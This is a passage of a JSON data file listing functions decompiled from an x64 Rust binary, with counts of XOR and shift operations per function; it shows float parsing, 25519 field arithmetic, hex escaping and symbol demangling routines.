        "Function Body": "\nunsigned __int64 __fastcall sub_14000CAB0(__int64 a1, unsigned __int64 a2)\n{\n  unsigned __int64 result; // rax\n  unsigned __int64 v4; // rcx\n  int v5; // ecx\n  __int64 v6; // rdi\n  unsigned __int64 v7; // r10\n  unsigned __int64 v8; // r11\n  unsigned __int128 v9; // kr00_16\n  int v10; // edx\n  __int64 v11; // rcx\n  unsigned __int64 v12; // rax\n  unsigned __int64 v13; // r9\n  __int64 v14; // rsi\n  bool v15; // cl\n  unsigned __int64 v16; // r11\n  unsigned __int64 v17; // rcx\n\n  result = 0i64;\n  if ( a1 >= -342 && a2 )\n  {\n    if ( a1 > 308 )\n      return 0i64;\n    _BitScanReverse64(&v4, a2);\n    v5 = v4 ^ 0x3F;\n    v6 = 16 * (a1 + 342);\n    v9 = *(unsigned __int64 *)((char *)&unk_140061510 + v6) * (unsigned __int128)(a2 << v5);\n    v8 = *((_QWORD *)&v9 + 1);\n    v7 = v9;\n    if ( !((unsigned __int64)(unsigned int)~DWORD2(v9) << 55) )\n    {\n      v8 = (((*(unsigned __int64 *)((char *)&unk_140061510 + v6 + 8) * (unsigned __int128)(a2 << v5)) >> 64) + v9) >> 64;\n      v7 = ((*(unsigned __int64 *)((char *)&unk_140061510 + v6 + 8) * (unsigned __int128)(a2 << v5)) >> 64) + v9;\n    }\n    if ( (unsigned __int64)(a1 - 56) <= 0xFFFFFFFFFFFFFFACui64 && v7 == -1i64 )\n    {\n      return 0i64;\n    }\n    else\n    {\n      v10 = (v8 >> 63) + ((217706 * (int)a1) >> 16) - v5 + 63;\n      v11 = (v8 >> 63) + 9;\n      v12 = v8 >> v11;\n      if ( v10 >= -1022 )\n      {\n        v13 = a1 + 4;\n        v14 = (v8 >> v11) & 3;\n        v15 = v12 << v11 == v8;\n        v16 = v12 & 0xFFFFFFFFFFFFFFFEui64;\n        if ( !v15 )\n          v16 = v12;\n        if ( (_DWORD)v14 != 1 )\n          v16 = v12;\n        if ( v7 >= 2 )\n          v16 = v12;\n        if ( v13 >= 0x1C )\n          v16 = v12;\n        v17 = (v16 + (v16 & 1)) >> 54;\n        if ( v10 - ((unsigned int)(v17 == 0) - 1) + 1023 > 0x7FE )\n          return 0i64;\n        result = 0i64;\n        if ( !v17 )\n          return ((v16 + (v16 & 1)) >> 1) & 0xEFFFFFFFFFFFFFi64;\n      }\n      else if ( (unsigned int)v10 >= 0xFFFFFBC3 )\n      {\n        return (_bittest64((const __int64 *)&v12, (unsigned int)(2 - v10)) + (v12 >> (2 - (unsigned __int8)v10))) >> 1;\n      }\n      else\n      {\n        return 0i64;\n      }\n    }\n  }\n  return result;\n}\n// 14000CAF0: conditional instruction was optimized away because rdx.8!=0\n\n"
    },
    {
        "Function": "sub_1400278CC",
        "Total XOR and shift operations": 8,
        "XOR operations": 0,
        "Shift operations": 8,
        "Operation percentage": "20.00%",
        "Function Body": "\nunsigned __int64 __fastcall sub_1400278CC(unsigned __int64 a1, unsigned __int64 a2)\n{\n  __int128 v2; // rt0\n  __int64 v4; // r10\n  __int64 v5; // r11\n  __int64 v6; // rdi\n  __int64 v7; // rax\n  bool v8; // cf\n  __int64 v9; // rax\n  __int128 v10; // rt0\n\n  if ( a2 >= 0x80000 )\n  {\n    v4 = (0x9598F4F1E8361973ui64 * (unsigned __int128)a1) >> 64;\n    v5 = (0x760F253EDB4AB0D2i64 * (unsigned __int128)a1) >> 64;\n    v6 = (0x9598F4F1E8361973ui64 * (unsigned __int128)a2) >> 64;\n    v7 = v5 + __CFADD__(v4, 0x760F253EDB4AB0D2i64 * a1) + 0x760F253EDB4AB0D2i64 * a2;\n    v8 = __CFADD__(\n           __CFADD__(\n             0x9598F4F1E8361973ui64 * a2,\n             (__PAIR128__(0x760F253EDB4AB0D2i64, 0x9598F4F1E8361973ui64) * a1) >> 64),\n           v7);\n    v9 = __CFADD__(0x9598F4F1E8361973ui64 * a2, (__PAIR128__(0x760F253EDB4AB0D2i64, 0x9598F4F1E8361973ui64) * a1) >> 64)\n       + v7;\n    *(_QWORD *)&v10 = v6 + v9;\n    *((_QWORD *)&v10 + 1) = (v8 | (unsigned __int8)__CFADD__(v6, v9))\n                          + (__CFADD__(__CFADD__(v4, 0x760F253EDB4AB0D2i64 * a1), 0x760F253EDB4AB0D2i64 * a2) | (unsigned __int8)__CFADD__(v5, __CFADD__(v4, 0x760F253EDB4AB0D2i64 * a1) + 0x760F253EDB4AB0D2i64 * a2))\n                          + ((0x760F253EDB4AB0D2i64 * (unsigned __int128)a2) >> 64);\n    return v10 >> 62;\n  }\n  else\n  {\n    *((_QWORD *)&v2 + 1) = a2;\n    *(_QWORD *)&v2 = a1;\n    return (unsigned __int64)(v2 >> 19) / 0x1158E460913Di64;\n  }\n}\n\n"
    },
    {
        "Function": "sub_14004E4AC",
        "Total XOR and shift operations": 2,
        "XOR operations": 1,
        "Shift operations": 1,
        "Operation percentage": "20.00%",
        "Function Body": "\nchar __fastcall sub_14004E4AC(unsigned __int16 a1)\n{\n  if ( a1 )\n    return (((a1 + 393206) & (a1 + 524188) ^ (a1 + 916504) & ((unsigned int)a1 + 514288)) >> 17) + 1;\n  else\n    return 1;\n}\n\n"
    },
    {
        "Function": "sub_14000DFF0",
        "Total XOR and shift operations": 5,
        "XOR operations": 0,
        "Shift operations": 5,
        "Operation percentage": "18.52%",
        "Function Body": "\n__int64 __fastcall sub_14000DFF0(_QWORD *a1, _QWORD *a2, _QWORD *a3)\n{\n  unsigned __int64 v3; // r10\n  unsigned __int64 v4; // r11\n  unsigned __int64 v5; // rsi\n  unsigned __int64 v6; // rax\n  unsigned __int64 v7; // r9\n  unsigned __int64 v8; // r14\n  __int64 result; // rax\n\n  v3 = a2[1] + 0x7FFFFFFFFFFFF0i64 - a3[1];\n  v4 = a2[2] + 0x7FFFFFFFFFFFF0i64 - a3[2];\n  v5 = a2[3] + 0x7FFFFFFFFFFFF0i64 - a3[3];\n  v6 = a2[4] + 0x7FFFFFFFFFFFF0i64 - a3[4];\n  v7 = *a2 + 0x7FFFFFFFFFFFF0i64 - *a3 - 288;\n  v8 = v6 >> 51;\n  result = (v5 >> 51) + (v6 & 0x7FFFFFFFFFFFFi64);\n  *a1 = (v7 & 0x7FFFFFFFFFFFFi64) + 19 * v8;\n  a1[1] = (v7 >> 51) + (v3 & 0x7FFFFFFFFFFFFi64);\n  a1[2] = (v3 >> 51) + (v4 & 0x7FFFFFFFFFFFFi64);\n  a1[3] = (v4 >> 51) + (v5 & 0x7FFFFFFFFFFFFi64);\n  a1[4] = result;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_140008860",
        "Total XOR and shift operations": 6,
        "XOR operations": 1,
        "Shift operations": 5,
        "Operation percentage": "17.14%",
        "Function Body": "\nunsigned __int64 __fastcall sub_140008860(__int64 a1, unsigned int a2)\n{\n  __int64 v2; // rdx\n  unsigned __int64 result; // rax\n  unsigned __int64 v4; // rdx\n  __int64 v5; // [rsp+2Eh] [rbp-Ah]\n  __int16 v6; // [rsp+36h] [rbp-2h]\n\n  BYTE2(v5) = 0;\n  LOWORD(v5) = 0;\n  HIBYTE(v6) = 125;\n  BYTE3(v5) = a0123456789abcd[(a2 >> 20) & 0xF];\n  BYTE4(v5) = a0123456789abcd[HIWORD(a2) & 0xF];\n  BYTE5(v5) = a0123456789abcd[(unsigned __int16)a2 >> 12];\n  BYTE6(v5) = a0123456789abcd[(a2 >> 8) & 0xF];\n  HIBYTE(v5) = a0123456789abcd[(unsigned __int8)a2 >> 4];\n  LOBYTE(v6) = a0123456789abcd[a2 & 0xF];\n  _BitScanReverse(&a2, a2 | 1);\n  v2 = (a2 ^ 0x1C) >> 2;\n  result = v2 - 2;\n  v4 = v2 + 1;\n  if ( v4 < result )\n    sub_14005D0B0(result, v4, (__int64)&off_1400614E0);\n  *((_BYTE *)&v5 + result + 2) = 123;\n  *(_WORD *)((char *)&v5 + result) = 30044;\n  *(_WORD *)(a1 + 8) = v6;\n  *(_QWORD *)a1 = v5;\n  *(_BYTE *)(a1 + 10) = result;\n  *(_BYTE *)(a1 + 11) = 10;\n  return result;\n}\n// 1400614E0: using guessed type void *off_1400614E0;\n\n"
    },
    {
        "Function": "sub_14000D709",
        "Total XOR and shift operations": 23,
        "XOR operations": 0,
        "Shift operations": 23,
        "Operation percentage": "16.91%",
        "Function Body": "\n__int64 __fastcall sub_14000D709(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)\n{\n  unsigned __int64 v3; // r12\n  unsigned __int64 v4; // rbp\n  __int128 v5; // rdi\n  __int128 v6; // kr10_16\n  unsigned __int64 v7; // r8\n  signed __int128 v8; // kr30_16\n  __int64 v9; // r9\n  unsigned __int64 v10; // rbx\n  __int64 v11; // r10\n  unsigned __int64 v12; // r14\n  __int64 v13; // r11\n  unsigned __int64 v14; // rbp\n  unsigned __int64 v15; // r12\n  unsigned __int64 v16; // r13\n  unsigned __int64 v17; // r15\n  signed __int128 v18; // kr50_16\n  signed __int128 v19; // kr60_16\n  signed __int128 v20; // kr70_16\n  unsigned __int64 v21; // r14\n  __int64 result; // rax\n  unsigned __int64 v23; // [rsp+0h] [rbp-150h]\n  unsigned __int128 v24; // [rsp+0h] [rbp-150h]\n  unsigned __int64 v25; // [rsp+8h] [rbp-148h]\n  unsigned __int64 v26; // [rsp+10h] [rbp-140h]\n  unsigned __int64 v27; // [rsp+10h] [rbp-140h]\n  unsigned __int64 v28; // [rsp+18h] [rbp-138h]\n  unsigned __int64 v29; // [rsp+20h] [rbp-130h]\n  unsigned __int64 v30; // [rsp+28h] [rbp-128h]\n  unsigned __int64 v31; // [rsp+30h] [rbp-120h]\n  unsigned __int64 v32; // [rsp+40h] [rbp-110h]\n  __int64 v33; // [rsp+50h] [rbp-100h]\n  __int64 v34; // [rsp+58h] [rbp-F8h]\n  unsigned __int64 v35; // [rsp+68h] [rbp-E8h]\n  unsigned __int64 v36; // [rsp+70h] [rbp-E0h]\n  unsigned __int64 v37; // [rsp+80h] [rbp-D0h]\n  unsigned __int64 v38; // [rsp+88h] [rbp-C8h]\n  unsigned __int64 v39; // [rsp+98h] [rbp-B8h]\n  unsigned __int64 v40; // [rsp+A0h] [rbp-B0h]\n  unsigned __int64 v41; // [rsp+B8h] [rbp-98h]\n  unsigned __int64 v42; // [rsp+C0h] [rbp-90h]\n  unsigned __int64 v43; // [rsp+D0h] [rbp-80h]\n  unsigned __int64 v44; // [rsp+E0h] [rbp-70h]\n  unsigned __int64 v45; // [rsp+E8h] [rbp-68h]\n  unsigned __int64 v46; // [rsp+F0h] [rbp-60h]\n  unsigned __int64 v47; // [rsp+108h] [rbp-48h]\n\n  v3 = *a3;\n  v32 = a3[1];\n  v25 = a3[2];\n  v26 = a3[3];\n  v47 = a3[4];\n  v31 = *a2;\n  v4 = a2[4];\n  *((_QWORD *)&v5 + 1) = (*a2 * (unsigned __int128)*a3 + 19 * v32 * (unsigned __int128)v4) >> 64;\n  v23 = a2[3];\n  *(_QWORD *)&v5 = 19 * v25 * v23;\n  v6 = __PAIR128__((19 * v25 * (unsigned __int128)v23) >> 64, *a2 * *a3 + 19 * v32 * v4) + v5;\n  v7 = a2[2];\n  *((_QWORD *)&v5 + 1) = a2[1];\n  v8 = v6 + 19 * v26 * (unsigned __int128)v7 + 19 * v47 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1);\n  v45 = (v3 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)) >> 64;\n  v41 = v3 * *((_QWORD *)&v5 + 1);\n  *(_QWORD *)&v5 = (19 * v25 * (unsigned __int128)v4) >> 64;\n  v9 = 19 * v25 * v4;\n  v35 = (19 * v26 * (unsigned __int128)v23) >> 64;\n  v33 = 19 * v26 * v23;\n  v30 = (v3 * (unsigned __int128)v7) >> 64;\n  v44 = v3 * v7;\n  v40 = (v25 * (unsigned __int128)*a2) >> 64;\n  v38 = v25 * *a2;\n  v10 = (19 * v26 * (unsigned __int128)v4) >> 64;\n  v11 = 19 * v26 * v4;\n  v36 = (19 * v47 * (unsigned __int128)v23) >> 64;\n  v34 = 19 * v47 * v23;\n  v29 = (v3 * (unsigned __int128)v23) >> 64;\n  v43 = v3 * v23;\n  v46 = (v25 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)) >> 64;\n  v42 = v25 * *((_QWORD *)&v5 + 1);\n  v39 = (v26 * (unsigned __int128)*a2) >> 64;\n  v37 = v26 * *a2;\n  v12 = (19 * v47 * (unsigned __int128)v4) >> 64;\n  v13 = 19 * v47 * v4;\n  v28 = (v3 * (unsigned __int128)v4) >> 64;\n  v14 = v3 * v4;\n  v15 = (v32 * (unsigned __int128)v23) >> 64;\n  v16 = v32 * v23;\n  v24 = v25 * (unsigned __int128)v7;\n  v17 = (v26 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)) >> 64;\n  v27 = v26 * *((_QWORD *)&v5 + 1);\n  v18 = (unsigned __int64)(v8 >> 51)\n      + __PAIR128__(v45, v41)\n      + 19 * v47 * (unsigned __int128)v7\n      + __PAIR128__(v35, v33)\n      + v32 * (unsigned __int128)*a2\n      + __PAIR128__(v5, v9);\n  v19 = (unsigned __int64)(v18 >> 51)\n      + v32 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)\n      + __PAIR128__(v30, v44)\n      + __PAIR128__(v36, v34)\n      + __PAIR128__(v40, v38)\n      + __PAIR128__(v10, v11);\n  v20 = (unsigned __int64)(v19 >> 51)\n      + __PAIR128__(v46, v42)\n      + v32 * (unsigned __int128)v7\n      + __PAIR128__(v29, v43)\n      + __PAIR128__(v39, v37)\n      + __PAIR128__(v12, v13);\n  v21 = v20 >> 51;\n  result = (v21 + v27 + v24 + v16 + v14 + v47 * *a2) & 0x7FFFFFFFFFFFFi64;\n  *a1 = ((v8 & 0x7FFFFFFFFFFFFi64)\n       + 19\n       * ((__int128)(v21\n                   + __PAIR128__(v17, v27)\n                   + v24\n                   + __PAIR128__(v15, v16)\n                   + __PAIR128__(v28, v14)\n                   + v47 * (unsigned __int128)*a2) >> 51)) & 0x7FFFFFFFFFFFFi64;\n  a1[1] = (v18 & 0x7FFFFFFFFFFFFi64)\n        + ((unsigned __int128)((v8 & 0x7FFFFFFFFFFFFi64)\n                             + 19\n                             * (unsigned __int64)((__int128)(v21\n                                                           + __PAIR128__(v17, v27)\n                                                           + v24\n                                                           + __PAIR128__(v15, v16)\n                                                           + __PAIR128__(v28, v14)\n                                                           + v47 * (unsigned __int128)v31) >> 51)) >> 51);\n  a1[2] = v19 & 0x7FFFFFFFFFFFFi64;\n  a1[3] = v20 & 0x7FFFFFFFFFFFFi64;\n  a1[4] = result;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_14001F920",
        "Total XOR and shift operations": 38,
        "XOR operations": 4,
        "Shift operations": 34,
        "Operation percentage": "5.16%",
        "Function Body": "\n__int64 *__fastcall sub_14001F920(__int64 *a1, __int64 a2, __int64 a3)\n{\n  unsigned __int64 v3; // rbp\n  char *v4; // r13\n  unsigned __int64 v5; // rbx\n  unsigned __int64 v6; // rdi\n  unsigned __int64 v7; // rcx\n  unsigned __int64 v8; // r15\n  __int64 v9; // r12\n  unsigned __int64 v10; // rcx\n  unsigned __int64 v11; // r11\n  unsigned __int64 v12; // r9\n  bool v13; // zf\n  unsigned __int64 v14; // rcx\n  unsigned __int64 v15; // r10\n  unsigned __int64 v16; // r10\n  unsigned __int64 v17; // rcx\n  __int64 v18; // r12\n  unsigned __int64 v19; // rdi\n  unsigned __int64 v20; // r14\n  __int64 v21; // r10\n  unsigned __int64 v22; // r9\n  char *v23; // r11\n  char v24; // r15\n  char *v25; // r9\n  unsigned __int64 v26; // r11\n  bool v27; // cf\n  char v28; // r14\n  unsigned __int64 v29; // rcx\n  unsigned __int64 v30; // rdi\n  unsigned __int64 v31; // rax\n  unsigned __int64 v32; // r8\n  char *v33; // r8\n  unsigned __int8 *v34; // rax\n  unsigned int v35; // ecx\n  int v36; // edx\n  int v37; // r11d\n  int v38; // r10d\n  __int64 v39; // r12\n  unsigned __int64 v40; // rbx\n  __int64 v41; // r15\n  __int64 v42; // r9\n  char *v43; // r9\n  unsigned __int8 *v44; // r10\n  __int64 v45; // rax\n  bool v46; // sf\n  int v47; // ebp\n  unsigned __int8 *v48; // rcx\n  int v49; // eax\n  int v50; // edx\n  int v51; // ebp\n  char v52; // al\n  __int64 v53; // r14\n  unsigned __int64 v54; // r14\n  __int64 v55; // rax\n  char *v56; // rcx\n  unsigned __int64 v57; // r8\n  unsigned __int64 v58; // rdx\n  unsigned __int64 v59; // r10\n  __int64 *v60; // rax\n  unsigned int v61; // ebp\n  unsigned __int64 v62; // rax\n  unsigned __int64 v63; // r8\n  __int64 v64; // rax\n  unsigned __int64 v65; // kr00_8\n  __int64 v66; // r12\n  int v67; // edx\n  char *v68; // r11\n  int v69; // edi\n  int v70; // r13d\n  int v71; // esi\n  __int64 v72; // rax\n  int v73; // r8d\n  int v74; // ebp\n  int v75; // esi\n  int v76; // r11d\n  __int64 v77; // rdx\n  unsigned __int8 *v78; // r8\n  int v79; // edi\n  int v80; // ebp\n  int v81; // esi\n  unsigned __int64 v82; // rsi\n  __int64 *result; // rax\n  char *v84; // [rsp+40h] [rbp-D8h] BYREF\n  unsigned __int64 v85; // [rsp+48h] [rbp-D0h]\n  unsigned __int64 v86; // [rsp+50h] [rbp-C8h]\n  unsigned __int64 v87; // [rsp+58h] [rbp-C0h] BYREF\n  __int64 v88; // [rsp+60h] [rbp-B8h]\n  unsigned __int64 v89; // [rsp+68h] [rbp-B0h]\n  unsigned __int64 v90; // [rsp+78h] [rbp-A0h]\n  __int64 v91; // [rsp+88h] [rbp-90h]\n  unsigned __int64 v92; // [rsp+90h] [rbp-88h]\n  __int64 v93; // [rsp+98h] [rbp-80h]\n  unsigned __int64 v94; // [rsp+A0h] [rbp-78h]\n  char *v95; // [rsp+A8h] [rbp-70h]\n  __int64 *v96; // [rsp+B0h] [rbp-68h]\n  unsigned __int64 v97; // [rsp+B8h] [rbp-60h]\n  __int64 v98[11]; // [rsp+C0h] [rbp-58h] BYREF\n\n  v3 = a3;\n  v4 = (char *)a2;\n  v96 = a1;\n  sub_14000ACB0(&v84, a2, a3, byte_140067908, 6ui64);\n  if ( !v84 )\n  {\n    do\n      sub_14001E390(v98, (__int64)&v84);\n    while ( v98[0] == 1 );\n    if ( !v98[0] )\n    {\n      v6 = v98[1];\n      goto LABEL_54;\n    }\nLABEL_81:\n    if ( v3 < 3 )\n    {\n      v39 = 2i64;\n      if ( v3 != 2 )\n        goto LABEL_196;\n      if ( *(_WORD *)v4 != 20058 )\n        goto LABEL_122;\n      v40 = 2i64;\n      v41 = 0i64;\n      v42 = 2i64;\nLABEL_97:\n      v43 = &v4[v42];\n      v44 = (unsigned __int8 *)&v43[v41];\n      v45 = 0i64;\n      while ( v41 != v45 )\n      {\n        v46 = v43[v45++] < 0;\n        if ( v46 )\n          goto LABEL_115;\n      }\n      if ( v41 )\n      {\n        v47 = (unsigned __int8)*v43;\n        if ( *v43 < 0 )\n        {\n          v49 = v47 & 0x1F;\n          v50 = v43[1] & 0x3F;\n          if ( (unsigned __int8)v47 <= 0xDFu )\n          {\n            v48 = (unsigned __int8 *)(v43 + 2);\n            v47 = v50 | (v49 << 6);\n          }\n          else\n          {\n            v51 = (v50 << 6) | v43[2] & 0x3F;\n            if ( (unsigned __int8)*v43 < 0xF0u )\n            {\n              v48 = (unsigned __int8 *)(v43 + 3);\n              v47 = (v49 << 12) | v51;\n            }\n            else\n            {\n              v48 = (unsigned __int8 *)(v43 + 4);\n              v47 = ((v49 & 7) << 18) | (v51 << 6) | v43[3] & 0x3F;\n            }\n          }\n        }\n        else\n        {\n          v48 = (unsigned __int8 *)(v43 + 1);\n        }\n        if ( v47 == 69 )\n        {\n          v54 = 0i64;\nLABEL_144:\n          v59 = v44 - v48;\n          if ( v59 )\n            goto LABEL_179;\n          goto LABEL_145;\n        }\n        if ( v47 != 1114112 )\n        {\n          v54 = 0i64;\n          while ( 1 )\n          {\n            v61 = v47 - 48;\n            if ( v61 > 9 )\n              break;\n            v62 = 0i64;\n            do\n            {\n              v63 = v62;\n              v65 = v62;\n              v64 = 10 * v62;\n              if ( !is_mul_ok(0xAui64, v65) )\n                goto LABEL_115;\n              v66 = v61;\n              v27 = __CFADD__(v61, v64);\n              v62 = v61 + v64;\n              if ( v27 || v48 == v44 )\n                goto LABEL_115;\n              v67 = *v48;\n              if ( (*v48 & 0x80u) == 0 )\n              {\n                ++v48;\n              }\n              else\n              {\n                v68 = v4;\n                v69 = v67 & 0x1F;\n                v70 = v48[1] & 0x3F;\n                if ( (unsigned __int8)v67 <= 0xDFu )\n                {\n                  v48 += 2;\n                  v67 = v70 | (v69 << 6);\n                  v4 = v68;\n                }\n                else\n                {\n                  v71 = (v70 << 6) | v48[2] & 0x3F;\n                  if ( *v48 < 0xF0u )\n                  {\n                    v48 += 3;\n                    v67 = (v69 << 12) | v71;\n                    v4 = v68;\n                  }\n                  else\n                  {\n                    v67 = ((v67 & 7) << 18) | (v71 << 6) | v48[3] & 0x3F;\n                    v4 = v68;\n                    if ( v67 == 1114112 )\n                      goto LABEL_115;\n                    v48 += 4;\n                  }\n                }\n              }\n              v61 = v67 - 48;\n            }\n            while ( (unsigned int)(v67 - 48) < 0xA );\n            if ( v62 )\n            {\n              v72 = v66 + 10 * v63;\n              while ( v48 != v44 )\n              {\n                v67 = *v48;\n                if ( (*v48 & 0x80u) == 0 )\n                {\n                  ++v48;\n                }\n                else\n                {\n                  v73 = v67 & 0x1F;\n                  v74 = v48[1] & 0x3F;\n                  if ( (unsigned __int8)v67 <= 0xDFu )\n                  {\n                    v48 += 2;\n                    v67 = v74 | (v73 << 6);\n                  }\n                  else\n                  {\n                    v75 = (v74 << 6) | v48[2] & 0x3F;\n                    if ( *v48 < 0xF0u )\n                    {\n                      v48 += 3;\n                      v67 = (v73 << 12) | v75;\n                    }\n                    else\n                    {\n                      v67 = ((v67 & 7) << 18) | (v75 << 6) | v48[3] & 0x3F;\n                      if ( v67 == 1114112 )\n                        goto LABEL_115;\n                      v48 += 4;\n                    }\n                  }\n                }\n                if ( !--v72 )\n                  goto LABEL_174;\n              }\n              break;\n            }\nLABEL_174:\n            ++v54;\n            v47 = v67;\n            if ( v67 == 69 )\n              goto LABEL_144;\n          }\n        }\n      }\nLABEL_115:\n      if ( v40 >= 3 )\n        goto LABEL_116;\nLABEL_122:\n      v40 = 2i64;\n      v39 = 2i64;\n      if ( *v4 != 82 )\n        goto LABEL_196;\n      goto LABEL_123;\n    }\n    if ( *(_WORD *)v4 ^ 0x5A5F | (unsigned __int8)v4[2] ^ 0x4E )\n    {\n      if ( *(_WORD *)v4 == 20058 )\n      {\n        if ( v4[2] <= -65 )\n          sub_14005D310(v4, v3, 2ui64, v3, (__int64)&off_140067370);\n        v41 = v3 - 2;\n        v42 = 2i64;\n      }\n      else\n      {\n        v40 = 3i64;\n        if ( v3 < 4 )\n        {\nLABEL_116:\n          if ( *(_WORD *)v4 == 21087 )\n          {\n            v52 = v4[2];\n            if ( v52 <= -65 )\n              sub_14005D310(v4, v40, 2ui64, v40, (__int64)&off_1400675A0);\n            v41 = (__int64)(v4 + 2);\n            v53 = -2i64;\n            goto LABEL_127;\n          }\n          if ( *v4 != 82 )\n          {\n            v39 = 2i64;\n            if ( v40 <= 3 || *(_WORD *)v4 ^ 0x5F5F | (unsigned __int8)v4[2] ^ 0x52 )\n              goto LABEL_196;\n            v52 = v4[3];\n            if ( v52 <= -65 )\n              sub_14005D310(v4, v40, 3ui64, v40, (__int64)&off_1400675D0);\n            v41 = (__int64)(v4 + 3);\n            v53 = -3i64;\nLABEL_127:\n            v39 = 2i64;\n            if ( (unsigned __int8)(v52 - 65) > 0x19u )\n              goto LABEL_196;\n            v54 = v40 + v53;\n            v55 = 0i64;\n            while ( v54 != v55 )\n            {\n              v46 = *(char *)(v41 + v55++) < 0;\n              if ( v46 )\n                goto LABEL_196;\n            }\n            v84 = (char *)v41;\n            v85 = v54;\n            v86 = 0i64;\n            LODWORD(v87) = 0;\n            v88 = 0i64;\n            LODWORD(v89) = 0;\n            if ( !(unsigned __int8)sub_14001A8E0((__int64)&v84, 0) )\n            {\n              v56 = v84;\n              if ( !v84 )\n                goto LABEL_196;\n              v57 = v86;\n              v58 = (unsigned __int8)v85 | ((((unsigned __int64)((HIBYTE(v85) << 16) | (unsigned int)*(unsigned __int16 *)((char *)&v85 + 5)) << 32) | *(unsigned int *)((char *)&v85 + 1)) << 8);\n              if ( v86 >= v58 || (unsigned __int8)(v84[v86] - 65) >= 0x1Au )\n              {\nLABEL_139:\n                if ( v57 )\n                {\n                  v59 = v58 - v57;\n                  if ( v58 <= v57 )\n                  {\n                    if ( v58 != v57 )\n                      goto LABEL_204;\n                  }\n                  else if ( v56[v57] <= -65 )\n                  {\nLABEL_204:\n                    sub_14005D310(v56, v58, v57, v58, (__int64)&off_1400675E8);\n                  }\n                }\n                else\n                {\n                  v59 = v58;\n                }\n                v48 = (unsigned __int8 *)&v56[v57];\n                v43 = 0i64;\n                if ( v59 )\n                {\nLABEL_179:\n                  v39 = 2i64;\n                  if ( *v48 == 46 )\n                  {\n                    LOBYTE(v76) = 46;\n                    v77 = 0xF0000003Fi64;\n                    v78 = v48;\nLABEL_181:\n                    ++v78;\n                    v76 = (unsigned __int8)v76;\n                    while ( 1 )\n                    {\n                      if ( (unsigned int)(v76 - 33) >= 0x19 && (v76 & 0xFFFFFFDF) - 65 >= 0x1A )\n                      {\n                        v82 = (unsigned int)(v76 - 91);\n                        if ( ((unsigned int)v82 > 0x23 || !_bittest64(&v77, v82)) && (unsigned int)(v76 - 58) >= 7 )\n                          break;\n                      }\n                      if ( v78 == &v48[v59] )\n                        goto LABEL_146;\n                      LOBYTE(v76) = *v78;\n                      if ( (*v78 & 0x80u) == 0 )\n                        goto LABEL_181;\n                      v79 = v76 & 0x1F;\n                      v80 = v78[1] & 0x3F;\n                      if ( (unsigned __int8)v76 <= 0xDFu )\n                      {\n                        v78 += 2;\n                        v76 = v80 | (v79 << 6);\n                      }\n                      else\n                      {\n                        v81 = (v80 << 6) | v78[2] & 0x3F;\n                        if ( (unsigned __int8)v76 < 0xF0u )\n                        {\n                          v78 += 3;\n                          v76 = (v79 << 12) | v81;\n                        }\n                        else\n                        {\n                          v76 = ((v76 & 7) << 18) | (v81 << 6) | v78[3] & 0x3F;\n                          if ( v76 == 1114112 )\n                            goto LABEL_146;\n                          v78 += 4;\n                        }\n                      }\n                    }\n                  }\n                  goto LABEL_196;\n                }\nLABEL_145:\n                v59 = 0i64;\nLABEL_146:\n                v60 = v96;\n                v96[1] = (__int64)v43;\n                v60[2] = v41;\n                v60[3] = v54;\n                v60[4] = (__int64)v4;\n                v60[5] = v40;\n                v60[6] = (__int64)v48;\n                v60[7] = v59;\n                v39 = 1i64;\n                goto LABEL_196;\n              }\n              v85 = (unsigned __int8)v85 | ((((unsigned __int64)((HIBYTE(v85) << 16) | (unsigned int)*(unsigned __int16 *)((char *)&v85 + 5)) << 32) | *(unsigned int *)((char *)&v85 + 1)) << 8);\n              _mm_storel_ps((double *)&v87, (__m128)v87);\n              v88 = 0i64;\n              LODWORD(v89) = 0;\n              if ( !(unsigned __int8)sub_14001A8E0((__int64)&v84, 0) )\n              {\n                v56 = v84;\n                if ( !v84 )\n                  goto LABEL_196;\n                v57 = v86;\n                v58 = (unsigned __int8)v85 | ((((unsigned __int64)((HIBYTE(v85) << 16) | (unsigned int)*(unsigned __int16 *)((char *)&v85 + 5)) << 32) | *(unsigned int *)((char *)&v85 + 1)) << 8);\n                goto LABEL_139;\n              }\n            }\n            sub_14005D130(\n              (unsigned int)\"`fmt::Error`s should be impossible without a `fmt::Formatter`\",\n              61,\n              (unsigned int)v98,\n              (unsigned int)&off_140067268,\n              (__int64)&off_140067640);\n          }\nLABEL_123:\n          v52 = v4[1];\n          if ( v52 <= -65 )\n            sub_14005D310(v4, v40, 1ui64, v40, (__int64)&off_1400675B8);\n          v41 = (__int64)(v4 + 1);\n          v53 = -1i64;\n          goto LABEL_127;\n        }\n        if ( *(_DWORD *)v4 != 1314545503 )\n        {\n          v40 = v3;\n          goto LABEL_116;\n        }\n        v42 = 4i64;\n        if ( v3 < 5 )\n        {\n          v41 = 0i64;\n          v40 = 4i64;\n          goto LABEL_97;\n        }\n        if ( v4[4] <= -65 )\n          sub_14005D310(v4, v3, 4ui64, v3, (__int64)&off_140067388);\n        v41 = v3 - 4;\n      }\n    }\n    else\n    {\n      v42 = 3i64;\n      if ( v3 < 4 )\n      {\n        v41 = 0i64;\n        v40 = 3i64;\n        goto LABEL_97;\n      }\n      if ( v4[3] <= -65 )\n        sub_14005D310(v4, v3, 3ui64, v3, (__int64)&off_140067358);\n      v41 = v3 - 3;\n    }\n    v40 = v3;\n    goto LABEL_97;\n  }\n  v95 = v4;\n  v5 = v90;\n  if ( v90 != -1i64 )\n  {\n    v6 = v89;\n    v7 = v89 + v94 - 1;\n    if ( v7 < v92 )\n    {\n      v8 = v94 - 1;\n      v9 = v88;\n      do\n      {\n        if ( _bittest64(&v9, *(unsigned __int8 *)(v91 + v7)) )\n        {\n          v10 = v5;\n          if ( v85 > v5 )\n            v10 = v85;\n          v11 = v10;\n          while ( v11 < v94 )\n          {\n            if ( v6 + v11 >= v92 )\n            {\n              v29 = v6 + v10;\n              if ( v92 > v29 )\n                v29 = v92;\n              sub_14005CD40(v29, v92, (__int64)&off_140068D10);\n            }\n            v12 = v11 + 1;\n            v13 = *(_BYTE *)(v93 + v11) == *(_BYTE *)(v91 + v6 + v11);\n            ++v11;\n            if ( !v13 )\n            {\n              v6 = v12 + 